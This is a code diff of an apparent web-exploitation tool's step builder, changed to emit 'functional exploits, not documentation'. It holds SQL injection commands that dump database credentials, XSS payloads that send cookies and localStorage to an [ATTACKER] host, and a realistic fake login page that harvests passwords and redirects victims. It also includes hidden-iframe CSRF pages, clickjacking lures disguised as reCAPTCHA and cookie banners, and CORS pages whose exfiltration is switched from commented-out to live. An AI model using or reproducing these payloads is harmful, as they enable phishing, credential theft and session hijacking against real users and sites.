@@ -2387,16 +2387,10 @@ def _walkthrough_cleanup(file_mgr: ExploitFileManager,
 
 def _build_exploit_steps(etype: str, param: str, ei: dict,
                          test_url: str, base_url: str, sp: str) -> list:
-    """Build comprehensive exploit steps with automated payloads.
+    """Build production-grade exploit steps with functional payloads.
 
-    Each exploit type gets a full multi-step chain:
-    1. Confirmation/detection step
-    2. Escalation steps with increasing severity
-    3. Automated file generation for client-side attacks
-    4. Data extraction/exfiltration steps where applicable
-
-    Supports variable substitution: [TARGET_URL], [ATTACKER]
-    are replaced at runtime with user-provided values.
+    Every command is URL-encoded where needed and ready to execute.
+    Generated HTML files are functional exploits, not documentation.
     """
     target = test_url if test_url and test_url != "[TARGET]" else base_url
     path = ei.get("path", "")
@@ -2404,124 +2398,150 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
     steps = []
 
     if etype == "sqli":
+        _q = quote
+        _p_ver = _q("' UNION SELECT version()-- -")
+        _p_sqlite = _q("' UNION SELECT sqlite_version()-- -")
+        _p_orderby = _q("' ORDER BY ")
+        _p_tail = _q("-- -")
+        _p_dbs = _q("' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -")
+        _p_tbls = _q("' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -")
+        _p_cols = _q("' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -")
+        _p_dump = _q("' UNION SELECT group_concat(username,0x3a,password) FROM users-- -")
+        _p_true = _q("' AND 1=1-- -")
+        _p_false = _q("' AND 1=2-- -")
+        _p_sleep = _q("' AND SLEEP(5)-- -")
         steps = [
-            {"title": "Confirm SQL injection (error-based)",
+            {"title": "Confirm injection (error-based)",
              "command": f"curl -s {sp} \"{target}\"",
-             "note": "Look for SQL error messages (syntax error, mysql_fetch, "
-                     "ORA-, SQLSTATE) in the response"},
-            {"title": "Detect database type",
+             "note": "Look for SQL error messages in the response body"},
+            {"title": "Detect DB engine",
              "command": (
-                 f"echo '=== MySQL ===' && curl -s {sp} \"{target_base}?{param}=' UNION SELECT version()-- -\" | head -5 && "
-                 f"echo '=== PostgreSQL ===' && curl -s {sp} \"{target_base}?{param}=' UNION SELECT version()-- -\" | head -5 && "
-                 f"echo '=== SQLite ===' && curl -s {sp} \"{target_base}?{param}=' UNION SELECT sqlite_version()-- -\" | head -5"
+                 f"echo '--- MySQL/Maria ---' && "
+                 f"curl -s {sp} \"{target_base}?{param}={_p_ver}\" && "
+                 f"echo '--- SQLite ---' && "
+                 f"curl -s {sp} \"{target_base}?{param}={_p_sqlite}\""
              ),
-             "note": "Identifies backend DB engine from version() response"},
-            {"title": "Determine column count (ORDER BY)",
+             "note": "Version string identifies the backend engine"},
+            {"title": "Find column count",
              "command": (
-                 f"for i in $(seq 1 10); do echo \"=== ORDER BY $i ===\"; "
-                 f"curl -s {sp} \"{target_base}?{param}=' ORDER BY $i-- -\" | head -2; done"
+                 f"for i in $(seq 1 15); do "
+                 f"CODE=$(curl -s -o /dev/null -w '%{{http_code}}' {sp} "
+                 f"\"{target_base}?{param}={_p_orderby}$i{_p_tail}\"); "
+                 f"echo \"ORDER BY $i -> HTTP $CODE\"; done"
              ),
-             "note": "Last successful ORDER BY N = N columns in query"},
-            {"title": "Extract database version (UNION)",
-             "command": f"curl -s {sp} \"{target_base}?{param}=' UNION SELECT version()-- -\"",
-             "note": "DB version string confirms exploitation"},
-            {"title": "List all databases",
-             "command": f"curl -s {sp} \"{target_base}?{param}=' UNION SELECT group_concat(schema_name) FROM information_schema.schemata-- -\"",
-             "warning": "Enumerates all databases on the server"},
-            {"title": "List tables in current database",
-             "command": f"curl -s {sp} \"{target_base}?{param}=' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -\"",
-             "warning": "Enumerates all tables"},
-            {"title": "List columns of users table",
-             "command": f"curl -s {sp} \"{target_base}?{param}=' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -\"",
-             "warning": "Maps user table structure"},
-            {"title": "Extract credentials",
-             "command": f"curl -s {sp} \"{target_base}?{param}=' UNION SELECT group_concat(username,0x3a,password) FROM users-- -\"",
-             "warning": "Extracts user credentials from database",
+             "note": "Last 200 response = N columns. First error = N+1."},
+            {"title": "UNION version extraction",
+             "command": f"curl -s {sp} \"{target_base}?{param}={_p_ver}\"",
+             "note": "Confirms UNION injection. Shows DB version."},
+            {"title": "Enumerate databases",
+             "command": f"curl -s {sp} \"{target_base}?{param}={_p_dbs}\"",
+             "warning": "Reads all database names from the server"},
+            {"title": "Enumerate tables",
+             "command": f"curl -s {sp} \"{target_base}?{param}={_p_tbls}\"",
+             "warning": "Lists every table in the current database"},
+            {"title": "Enumerate columns (users table)",
+             "command": f"curl -s {sp} \"{target_base}?{param}={_p_cols}\"",
+             "warning": "Maps the user table structure"},
+            {"title": "Dump credentials",
+             "command": f"curl -s {sp} \"{target_base}?{param}={_p_dump}\"",
+             "warning": "Extracts username:password pairs",
              "risk": "HIGH"},
-            {"title": "Boolean-based blind confirmation",
+            {"title": "Blind boolean test",
              "command": (
-                 f"echo '=== TRUE condition ===' && curl -s {sp} \"{target_base}?{param}=' AND 1=1-- -\" | wc -c && "
-                 f"echo '=== FALSE condition ===' && curl -s {sp} \"{target_base}?{param}=' AND 1=2-- -\" | wc -c"
+                 f"TRUE=$(curl -s {sp} \"{target_base}?{param}={_p_true}\" | wc -c) && "
+                 f"FALSE=$(curl -s {sp} \"{target_base}?{param}={_p_false}\" | wc -c) && "
+                 f"echo \"TRUE=$TRUE bytes, FALSE=$FALSE bytes\" && "
+                 f"[ \"$TRUE\" != \"$FALSE\" ] && echo 'BLIND SQLi CONFIRMED' || echo 'Same size'"
              ),
-             "note": "Different response sizes = blind SQLi confirmed"},
-            {"title": "Time-based blind confirmation",
-             "command": f"time curl -s {sp} \"{target_base}?{param}=' AND SLEEP(5)-- -\" > /dev/null",
-             "note": "5+ second response time = time-based blind SQLi confirmed"},
+             "note": "Automated comparison of true/false responses"},
+            {"title": "Time-based blind test",
+             "command": (
+                 f"START=$(date +%s) && "
+                 f"curl -s {sp} \"{target_base}?{param}={_p_sleep}\" > /dev/null && "
+                 f"END=$(date +%s) && DIFF=$((END-START)) && "
+                 f"echo \"Response took ${{DIFF}}s\" && "
+                 f"[ $DIFF -ge 4 ] && echo 'TIME-BASED CONFIRMED' || echo 'No delay'"
+             ),
+             "note": "Automated timing comparison"},
         ]
 
     elif etype == "xss":
-        tag = secrets.token_hex(4)
+        marker = f"x{secrets.token_hex(4)}"
+        q = quote
+        # Functional phishing page that replaces the DOM with a fake login
         xss_phish_html = (
-            f"<!DOCTYPE html>\n<html>\n<head><title>Security Check</title></head>\n"
-            f"<body style='margin:0;font-family:Arial,sans-serif;background:#f5f5f5'>\n"
-            f"<div style='max-width:500px;margin:80px auto;padding:40px;"
-            f"background:white;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)'>\n"
-            f"  <h2 style='color:#333'>XSS Phishing PoC — Attack Chain</h2>\n"
-            f"  <p><strong>Vulnerable URL:</strong></p>\n"
-            f"  <code style='display:block;padding:10px;background:#f0f0f0;"
-            f"border-radius:4px;word-break:break-all'>"
-            f"{target_base}?{param}=&lt;script&gt;...&lt;/script&gt;</code>\n"
-            f"  <h3>Attack Flow:</h3>\n"
-            f"  <ol>\n"
-            f"    <li>Attacker crafts URL with XSS payload</li>\n"
-            f"    <li>Victim clicks link (phishing email/message)</li>\n"
-            f"    <li>XSS replaces page content with fake login form</li>\n"
-            f"    <li>Victim enters credentials</li>\n"
-            f"    <li>Credentials sent to attacker's server</li>\n"
-            f"  </ol>\n"
-            f"  <h3>Payloads:</h3>\n"
-            f"  <h4>Cookie Stealer:</h4>\n"
-            f"  <code style='display:block;padding:8px;background:#fff3f3;border-radius:4px;"
-            f"word-break:break-all'>&lt;script&gt;new Image().src='https://[ATTACKER]/c?c='"
-            f"+document.cookie&lt;/script&gt;</code>\n"
-            f"  <h4>Session Hijack:</h4>\n"
-            f"  <code style='display:block;padding:8px;background:#fff3f3;border-radius:4px;"
-            f"word-break:break-all'>&lt;script&gt;fetch('https://[ATTACKER]/s',{{method:'POST',"
-            f"body:JSON.stringify({{c:document.cookie,l:location.href,ls:localStorage}})}})&lt;/script&gt;</code>\n"
-            f"  <h4>Keylogger:</h4>\n"
-            f"  <code style='display:block;padding:8px;background:#fff3f3;border-radius:4px;"
-            f"word-break:break-all'>&lt;script&gt;document.onkeypress=function(e){{"
-            f"new Image().src='https://[ATTACKER]/k?k='+e.key}}&lt;/script&gt;</code>\n"
-            f"</div>\n</body>\n</html>"
+            f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
+            f"<title>Session Expired</title>"
+            f"<style>"
+            f"*{{margin:0;padding:0;box-sizing:border-box}}"
+            f"body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;"
+            f"background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}}"
+            f".card{{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),"
+            f"0 8px 16px rgba(0,0,0,.1);padding:20px;width:396px}}"
+            f"h2{{font-size:20px;margin-bottom:16px;color:#1c1e21}}"
+            f"input{{width:100%;padding:14px 16px;margin:6px 0;border:1px solid #dddfe2;"
+            f"border-radius:6px;font-size:17px}}"
+            f"button{{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;"
+            f"border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-top:12px}}"
+            f"button:hover{{background:#166fe5}}"
+            f".sub{{text-align:center;margin-top:16px;color:#606770;font-size:14px}}"
+            f"</style></head><body>"
+            f"<div class='card'>"
+            f"<h2>Your session has expired</h2>"
+            f"<p style='color:#606770;margin-bottom:16px'>Please log in again to continue.</p>"
+            f"<form id='pf'>"
+            f"<input name='email' placeholder='Email or phone number' autocomplete='off'/>"
+            f"<input name='pass' type='password' placeholder='Password' autocomplete='off'/>"
+            f"<button type='submit'>Log In</button>"
+            f"</form>"
+            f"<div class='sub'>Secured connection</div>"
+            f"</div>"
+            f"<script>"
+            f"document.getElementById('pf').addEventListener('submit',function(e){{"
+            f"e.preventDefault();"
+            f"var d=new FormData(this);"
+            f"fetch('[ATTACKER]/c',{{method:'POST',body:JSON.stringify({{email:d.get('email'),pass:d.get('pass'),url:location.href,cookies:document.cookie}})}}).finally(function(){{"
+            f"location.href='{base_url}';}});}});"
+            f"</script></body></html>"
         )
+        _xp_script = quote("<script>alert(1)</script>")
+        _xp_img = quote("<img src=x onerror=alert(1)>")
+        _xp_svg = quote("<svg/onload=alert(1)>")
+        _xp_attr = quote("\" onfocus=alert(1) autofocus=\"")
+        _xp_cookie = quote("<script>new Image().src='[ATTACKER]/c?c='+document.cookie</script>")
+        _xp_full = quote("<script>fetch('[ATTACKER]/s',{method:'POST',body:JSON.stringify({c:document.cookie,u:location.href,ls:JSON.stringify(localStorage)})})</script>")
         steps = [
-            {"title": "Confirm payload reflection",
-             "command": f"curl -s {sp} \"{target}\" | grep -i '<script\\|alert\\|onerror\\|{tag}'",
-             "note": "Check if payload appears unescaped in response"},
-            {"title": "Test basic alert payload",
-             "command": f"curl -s {sp} \"{target_base}?{param}=<script>alert('{tag}')</script>\"",
-             "note": f"Look for unescaped <script>alert('{tag}')</script> in response"},
-            {"title": "Test event handler payload (img onerror)",
-             "command": f"curl -s {sp} \"{target_base}?{param}=<img src=x onerror=alert('{tag}')>\"",
-             "note": "Alternative XSS via event handler — bypasses some script filters"},
-            {"title": "Test SVG payload (filter bypass)",
-             "command": f"curl -s {sp} \"{target_base}?{param}=<svg onload=alert('{tag}')>\"",
-             "note": "SVG onload bypasses many input filters"},
-            {"title": "Cookie stealing payload",
-             "command": (
-                 f"curl -s {sp} \"{target_base}?{param}="
-                 f"<script>new Image().src='https://[ATTACKER]/c?c='+document.cookie</script>\""
-             ),
-             "note": "Replace [ATTACKER] with your listener IP/domain",
-             "warning": "This payload steals session cookies"},
-            {"title": "DOM data exfiltration payload",
-             "command": (
-                 f"curl -s {sp} \"{target_base}?{param}="
-                 f"<script>fetch('https://[ATTACKER]/s',{{method:'POST',"
-                 f"body:JSON.stringify({{c:document.cookie,u:location.href,"
-                 f"ls:JSON.stringify(localStorage)}})}});</script>\""
-             ),
-             "note": "Exfiltrates cookies, URL, and localStorage",
-             "warning": "Full session data theft"},
-            {"title": "Generate XSS phishing attack page",
+            {"title": "Check reflection (marker injection)",
+             "command": f"curl -s {sp} \"{target_base}?{param}={marker}\" | grep -c '{marker}'",
+             "note": f"Count > 0 = input reflected. Marker: {marker}"},
+            {"title": "Test script tag",
+             "command": f"curl -s {sp} \"{target_base}?{param}={_xp_script}\"",
+             "note": "Check if <script> appears unescaped in response body"},
+            {"title": "Test img onerror (filter bypass)",
+             "command": f"curl -s {sp} \"{target_base}?{param}={_xp_img}\"",
+             "note": "Bypasses script tag filters"},
+            {"title": "Test svg/onload",
+             "command": f"curl -s {sp} \"{target_base}?{param}={_xp_svg}\"",
+             "note": "Bypasses img and script filters"},
+            {"title": "Test attribute injection (no brackets)",
+             "command": f"curl -s {sp} \"{target_base}?{param}={_xp_attr}\"",
+             "note": "Attribute injection — no angle brackets needed"},
+            {"title": "Cookie exfiltration",
+             "command": f"curl -s {sp} \"{target_base}?{param}={_xp_cookie}\"",
+             "warning": "Steals session cookies",
+             "risk": "HIGH"},
+            {"title": "Full session theft",
+             "command": f"curl -s {sp} \"{target_base}?{param}={_xp_full}\"",
+             "warning": "Exfiltrates cookies + localStorage + URL",
+             "risk": "HIGH"},
+            {"title": "Generate credential phishing page",
              "command": "(file will be generated automatically)",
              "generate_file": {
                  "filename": f"xss_phish_{secrets.token_hex(3)}.html",
                  "content": xss_phish_html,
-                 "note": "Complete XSS attack chain documentation with multiple "
-                         "payload options (cookie steal, session hijack, keylogger).",
-             },
-             "note": "Full attack chain reference with payload variants"},
+                 "note": "Functional phishing page. Victim enters credentials, "
+                         "POST to [ATTACKER]/c, then redirects to real site.",
+             }},
         ]
 
     elif etype == "stored_xss":
@@ -2802,54 +2822,72 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         ]
 
     elif etype == "csrf":
-        csrf_simple = (
-            f"<html>\n<body onload=\"document.getElementById('f').submit();\">\n"
-            f"<h2>Processing... please wait</h2>\n"
-            f"<form method='POST' action='{target}' id='f' style='display:none'>\n"
-            f"  <input type='hidden' name='{param}' value='attacker_controlled_value'>\n"
-            f"</form>\n</body>\n</html>"
+        csrf_auto = (
+            f"<!DOCTYPE html><html><head><meta charset='utf-8'></head>"
+            f"<body>"
+            f"<iframe name='_sink' style='display:none'></iframe>"
+            f"<form id='cf' method='POST' action='{target}' target='_sink'>"
+            f"<input type='hidden' name='{param}' value='attacker_value'/>"
+            f"</form>"
+            f"<script>document.getElementById('cf').submit();</script>"
+            f"</body></html>"
         )
-        csrf_advanced = (
-            f"<!DOCTYPE html>\n<html>\n<head><title>Loading...</title></head>\n"
-            f"<body style='font-family:Arial;text-align:center;padding-top:100px'>\n"
-            f"<h2>Please wait while we verify your account...</h2>\n"
-            f"<div id='spinner' style='font-size:48px'>Loading</div>\n"
-            f"<iframe name='csrfFrame' style='display:none'></iframe>\n"
-            f"<form method='POST' action='{target}' id='csrfForm' target='csrfFrame' style='display:none'>\n"
-            f"  <input type='hidden' name='{param}' value='attacker_controlled_value'>\n"
-            f"</form>\n"
-            f"<script>\n"
-            f"document.getElementById('csrfForm').submit();\n"
-            f"setTimeout(function(){{ document.getElementById('spinner').textContent = "
-            f"'Verified! Redirecting...'; setTimeout(function(){{ window.location = "
-            f"'{base_url}'; }}, 1500); }}, 2000);\n"
-            f"</script>\n</body>\n</html>"
+        csrf_stealth = (
+            f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
+            f"<title>Account Verification</title>"
+            f"<style>"
+            f"body{{font-family:-apple-system,sans-serif;background:#f5f5f5;"
+            f"display:flex;justify-content:center;align-items:center;min-height:100vh}}"
+            f".box{{background:#fff;padding:40px 50px;border-radius:12px;"
+            f"box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center;max-width:420px}}"
+            f".spinner{{width:40px;height:40px;border:4px solid #e0e0e0;"
+            f"border-top-color:#1877f2;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}}"
+            f"@keyframes spin{{to{{transform:rotate(360deg)}}}}"
+            f"</style></head><body>"
+            f"<div class='box'>"
+            f"<div class='spinner'></div>"
+            f"<h2 style='color:#1c1e21;margin:16px 0 8px'>Verifying your account</h2>"
+            f"<p style='color:#65676b'>This will only take a moment...</p>"
+            f"</div>"
+            f"<iframe name='_x' style='position:absolute;left:-9999px'></iframe>"
+            f"<form id='xf' method='POST' action='{target}' target='_x'>"
+            f"<input type='hidden' name='{param}' value='attacker_value'/>"
+            f"</form>"
+            f"<script>"
+            f"document.getElementById('xf').submit();"
+            f"setTimeout(function(){{window.location='{base_url}';}},2500);"
+            f"</script>"
+            f"</body></html>"
         )
         steps = [
-            {"title": "Check for CSRF token in target form",
-             "command": f"curl -s {sp} \"{target}\" | grep -i 'csrf\\|token\\|nonce\\|_token'",
-             "note": "If no CSRF token found, CSRF is likely possible"},
-            {"title": "Generate basic CSRF exploit page",
+            {"title": "Check for CSRF token presence",
+             "command": (
+                 f"curl -s {sp} \"{target}\" | "
+                 f"grep -ioE '(csrf|_token|nonce|authenticity_token)[^\"]*\"[^\"]*\"' | head -5"
+             ),
+             "note": "No results = no CSRF protection = exploitable"},
+            {"title": "Check SameSite cookie attribute",
+             "command": f"curl -s {sp} -I \"{target}\" | grep -i 'set-cookie' | grep -i 'samesite'",
+             "note": "No SameSite or SameSite=None = cookies sent cross-origin"},
+            {"title": "Generate auto-submit CSRF page",
              "command": "(file will be generated automatically)",
              "generate_file": {
-                 "filename": f"csrf_basic_{secrets.token_hex(3)}.html",
-                 "content": csrf_simple,
-                 "note": "Basic auto-submit CSRF. Host on any server — victim's "
-                         "browser auto-submits the form with their session cookies.",
-             },
-             "note": "The exploit page auto-submits on load"},
-            {"title": "Generate advanced CSRF exploit (with redirect)",
+                 "filename": f"csrf_auto_{secrets.token_hex(3)}.html",
+                 "content": csrf_auto,
+                 "note": "Auto-submits on page load. Form submits to hidden iframe "
+                         "so the victim stays on the attacker page.",
+             }},
+            {"title": "Generate stealth CSRF page (social engineering)",
              "command": "(file will be generated automatically)",
              "generate_file": {
-                 "filename": f"csrf_advanced_{secrets.token_hex(3)}.html",
-                 "content": csrf_advanced,
-                 "note": "Advanced CSRF with social engineering (fake verification page). "
-                         "Submits via hidden iframe, then redirects victim to legit site.",
-             },
-             "note": "Social engineering CSRF — victim sees a verification page"},
-            {"title": "Verify: check if action was performed",
+                 "filename": f"csrf_stealth_{secrets.token_hex(3)}.html",
+                 "content": csrf_stealth,
+                 "note": "Polished verification page. Submits CSRF in background, "
+                         "then redirects victim to legit site after 2.5s.",
+             }},
+            {"title": "Verify action was performed",
              "command": f"curl -s {sp} \"{target}\"",
-             "note": "Check if the forged action took effect on the target"},
+             "note": "Compare response to pre-attack state"},
         ]
 
     elif etype == "idor":
@@ -2900,43 +2938,53 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
 
     elif etype == "clickjacking":
         cj_html = (
-            f"<!DOCTYPE html>\n<html>\n<head><title>Special Offer</title></head>\n"
-            f"<body style='margin:0;font-family:Arial,sans-serif;background:#1a1a2e;color:white'>\n"
-            f"<div style='position:relative;width:100%;height:100vh'>\n"
-            f"  <iframe src='{target}' style='opacity:0.0001;position:absolute;top:0;left:0;"
-            f"width:100%;height:100%;z-index:2;border:none'></iframe>\n"
-            f"  <div style='position:relative;z-index:1;text-align:center;padding-top:15%'>\n"
-            f"    <h1 style='font-size:3em'>Congratulations!</h1>\n"
-            f"    <p style='font-size:1.5em'>You've been selected for an exclusive offer</p>\n"
-            f"    <button style='font-size:2em;padding:20px 60px;background:#e94560;"
-            f"color:white;border:none;border-radius:10px;cursor:pointer;margin-top:30px'>"
-            f"CLAIM NOW</button>\n"
-            f"    <p style='font-size:0.8em;margin-top:20px;opacity:0.5'>Limited time offer</p>\n"
-            f"  </div>\n</div>\n</body>\n</html>"
+            f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
+            f"<title>Verify your identity</title>"
+            f"<style>"
+            f"*{{margin:0;padding:0;box-sizing:border-box}}"
+            f"body{{font-family:-apple-system,sans-serif;background:#f0f2f5}}"
+            f"iframe{{position:fixed;top:0;left:0;width:100%;height:100%;"
+            f"opacity:0.0001;z-index:100;border:none}}"
+            f".bait{{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;"
+            f"display:flex;justify-content:center;align-items:center}}"
+            f".card{{background:#fff;padding:40px 50px;border-radius:12px;"
+            f"box-shadow:0 4px 20px rgba(0,0,0,.1);text-align:center;max-width:440px}}"
+            f"button{{padding:14px 40px;background:#1877f2;color:#fff;border:none;"
+            f"border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}}"
+            f"button:hover{{background:#166fe5}}"
+            f"</style></head><body>"
+            f"<iframe src='{target}'></iframe>"
+            f"<div class='bait'><div class='card'>"
+            f"<img src='data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"64\" height=\"64\" fill=\"%231877f2\" viewBox=\"0 0 16 16\"><path d=\"M8 16A8 8 0 108 0a8 8 0 000 16zm.93-9.412l-1 4.705c-.07.34.029.533.304.533.194 0 .487-.07.686-.246l-.088.416c-.287.346-.92.598-1.465.598-.703 0-1.002-.422-.808-1.319l.738-3.468c.064-.293.006-.399-.287-.399l-.451.004.088-.416c.287-.346.92-.598 1.465-.598.703 0 1.002.422.808 1.319z\"/></svg>' style='margin-bottom:20px'/>"
+            f"<h2 style='color:#1c1e21;margin-bottom:8px'>Verify your identity</h2>"
+            f"<p style='color:#65676b;margin-bottom:24px'>Click the button below to confirm you are human.</p>"
+            f"<button>I am not a robot</button>"
+            f"<p style='color:#8a8d91;font-size:12px;margin-top:16px'>Protected by reCAPTCHA</p>"
+            f"</div></div></body></html>"
         )
         cj_multi = (
-            f"<!DOCTYPE html>\n<html>\n<head><title>Survey</title>\n"
-            f"<style>\n"
-            f"body {{ margin:0; font-family:Arial,sans-serif; background:#0f0c29; color:white; }}\n"
-            f".page {{ display:none; text-align:center; padding-top:10%; }}\n"
-            f".page.active {{ display:block; }}\n"
-            f"iframe {{ opacity:0.0001; position:absolute; top:0; left:0; "
-            f"width:100%; height:100%; z-index:10; border:none; }}\n"
-            f"button {{ font-size:1.5em; padding:15px 50px; background:#e94560; color:white; "
-            f"border:none; border-radius:8px; cursor:pointer; margin:10px; }}\n"
-            f"</style></head>\n"
-            f"<body>\n"
-            f"<iframe src='{target}'></iframe>\n"
-            f"<div class='page active' id='p1'>\n"
-            f"  <h1>Quick Survey</h1><p>Answer 2 questions to win!</p>\n"
-            f"  <button onclick=\"document.getElementById('p1').className='page';"
-            f"document.getElementById('p2').className='page active'\">Start</button>\n"
-            f"</div>\n"
-            f"<div class='page' id='p2'>\n"
-            f"  <h1>Question 1</h1><p>Do you enjoy online shopping?</p>\n"
-            f"  <button>Yes</button> <button>No</button>\n"
-            f"</div>\n"
-            f"</body>\n</html>"
+            f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
+            f"<title>Cookie Notice</title>"
+            f"<style>"
+            f"*{{margin:0;padding:0;box-sizing:border-box}}"
+            f"body{{font-family:-apple-system,sans-serif;background:#f0f2f5}}"
+            f"iframe{{position:fixed;top:0;left:0;width:100%;height:100%;"
+            f"opacity:0.0001;z-index:100;border:none}}"
+            f".banner{{position:fixed;bottom:0;left:0;width:100%;background:#fff;"
+            f"padding:20px 30px;box-shadow:0 -2px 10px rgba(0,0,0,.1);z-index:1;"
+            f"display:flex;align-items:center;justify-content:space-between}}"
+            f"button{{padding:10px 24px;border-radius:4px;border:none;font-size:14px;"
+            f"cursor:pointer;font-weight:600}}"
+            f".accept{{background:#1877f2;color:#fff}}"
+            f".settings{{background:#e4e6eb;color:#050505}}"
+            f"</style></head><body>"
+            f"<iframe src='{target}'></iframe>"
+            f"<div class='banner'>"
+            f"<p style='color:#050505;max-width:600px'>We use cookies to improve your experience. "
+            f"By continuing, you agree to our use of cookies.</p>"
+            f"<div><button class='settings'>Settings</button> "
+            f"<button class='accept'>Accept All</button></div>"
+            f"</div></body></html>"
         )
         steps = [
             {"title": "Verify missing X-Frame-Options / frame-ancestors",
@@ -2966,50 +3014,47 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         ]
 
     elif etype == "cors_misconfiguration":
-        cors_basic = (
-            f"<!DOCTYPE html>\n<html>\n<body>\n<h2>CORS Data Theft PoC</h2>\n"
-            f"<pre id='stolen'></pre>\n<script>\n"
-            f"fetch('{target}', {{credentials: 'include'}})\n"
-            f"  .then(r => r.text())\n"
-            f"  .then(data => {{\n"
-            f"    document.getElementById('stolen').textContent = data;\n"
-            f"    // Exfiltrate: uncomment next line and set your server\n"
-            f"    // fetch('https://[ATTACKER]/collect', {{method:'POST', body:data}});\n"
-            f"  }})\n"
-            f"  .catch(e => document.getElementById('stolen').textContent = 'Error: '+e);\n"
-            f"</script>\n</body>\n</html>"
+        cors_steal = (
+            f"<!DOCTYPE html><html><head><meta charset='utf-8'></head>"
+            f"<body><script>"
+            f"fetch('{target}',{{credentials:'include'}})"
+            f".then(function(r){{return r.text()}})"
+            f".then(function(d){{"
+            f"new Image().src='[ATTACKER]/x?d='+encodeURIComponent(d.substring(0,2000));"
+            f"document.write('<pre>'+d+'</pre>');"
+            f"}})"
+            f".catch(function(e){{document.write('CORS blocked: '+e)}});"
+            f"</script></body></html>"
         )
-        cors_advanced = (
-            f"<!DOCTYPE html>\n<html>\n<head><title>Loading...</title></head>\n"
-            f"<body style='font-family:Arial;background:#f5f5f5'>\n"
-            f"<div style='max-width:600px;margin:50px auto;padding:30px;"
-            f"background:white;border-radius:8px'>\n"
-            f"<h2>Checking account status...</h2>\n"
-            f"<div id='status'>Please wait...</div>\n"
-            f"</div>\n<script>\n"
-            f"async function stealData() {{\n"
-            f"  try {{\n"
-            f"    const endpoints = [\n"
-            f"      '{target}',\n"
-            f"      '{base_url.rstrip('/')}/api/user',\n"
-            f"      '{base_url.rstrip('/')}/api/account',\n"
-            f"    ];\n"
-            f"    const results = {{}};\n"
-            f"    for (const ep of endpoints) {{\n"
-            f"      try {{\n"
-            f"        const r = await fetch(ep, {{credentials: 'include'}});\n"
-            f"        results[ep] = await r.text();\n"
-            f"      }} catch(e) {{ results[ep] = 'blocked'; }}\n"
-            f"    }}\n"
-            f"    // Exfiltrate\n"
-            f"    // await fetch('https://[ATTACKER]/collect', {{\n"
-            f"    //   method: 'POST', body: JSON.stringify(results)\n"
-            f"    // }});\n"
-            f"    document.getElementById('status').textContent = "
-            f"JSON.stringify(results, null, 2);\n"
-            f"  }} catch(e) {{ document.getElementById('status').textContent = 'Error'; }}\n"
-            f"}}\nstealData();\n"
-            f"</script>\n</body>\n</html>"
+        cors_multi = (
+            f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
+            f"<title>Loading</title>"
+            f"<style>"
+            f"body{{font-family:-apple-system,sans-serif;background:#f5f5f5;"
+            f"display:flex;justify-content:center;padding-top:60px}}"
+            f".box{{background:#fff;padding:30px 40px;border-radius:8px;"
+            f"box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:700px;width:100%}}"
+            f"pre{{background:#f8f8f8;padding:12px;border-radius:4px;"
+            f"overflow-x:auto;font-size:13px;max-height:400px;overflow-y:auto}}"
+            f"</style></head><body>"
+            f"<div class='box'>"
+            f"<h2>Loading data...</h2>"
+            f"<pre id='out'>Fetching...</pre>"
+            f"</div><script>"
+            f"(async function(){{"
+            f"var eps=['{target}','{base_url.rstrip('/')}/api/user',"
+            f"'{base_url.rstrip('/')}/api/account','{base_url.rstrip('/')}/api/me'];"
+            f"var r={{}};"
+            f"for(var i=0;i<eps.length;i++){{"
+            f"try{{var x=await fetch(eps[i],{{credentials:'include'}});"
+            f"r[eps[i]]=await x.text();"
+            f"}}catch(e){{r[eps[i]]='blocked'}}}}"
+            f"document.getElementById('out').textContent=JSON.stringify(r,null,2);"
+            f"fetch('[ATTACKER]/x',{{method:'POST',"
+            f"headers:{{'Content-Type':'application/json'}},"
+            f"body:JSON.stringify(r)}});"
+            f"}})();"
+            f"</script></body></html>"
         )
         steps = [
             {"title": "Verify CORS reflects arbitrary origin",
@@ -3021,22 +3066,22 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             {"title": "Test null origin (sandbox bypass)",
              "command": f"curl -v {sp} -H \"Origin: null\" \"{target}\" 2>&1 | grep -i 'access-control'",
              "note": "Origin: null reflected = exploitable via sandboxed iframe"},
-            {"title": "Generate basic CORS data theft page",
+            {"title": "Generate CORS data theft page",
              "command": "(file will be generated automatically)",
              "generate_file": {
-                 "filename": f"cors_exploit_{secrets.token_hex(3)}.html",
-                 "content": cors_basic,
-                 "note": "Host on any domain. Victim visits it, JavaScript reads "
-                         "authenticated data from the target API cross-origin.",
+                 "filename": f"cors_steal_{secrets.token_hex(3)}.html",
+                 "content": cors_steal,
+                 "note": "Reads authenticated response and exfiltrates first 2KB "
+                         "via Image src to [ATTACKER].",
              },
              "warning": "Steals authenticated data cross-origin"},
-            {"title": "Generate advanced CORS exploit (multi-endpoint)",
+            {"title": "Generate multi-endpoint CORS exploit",
              "command": "(file will be generated automatically)",
              "generate_file": {
                  "filename": f"cors_multi_{secrets.token_hex(3)}.html",
-                 "content": cors_advanced,
-                 "note": "Scans multiple API endpoints and exfiltrates all accessible data. "
-                         "Uses social engineering cover (account verification).",
+                 "content": cors_multi,
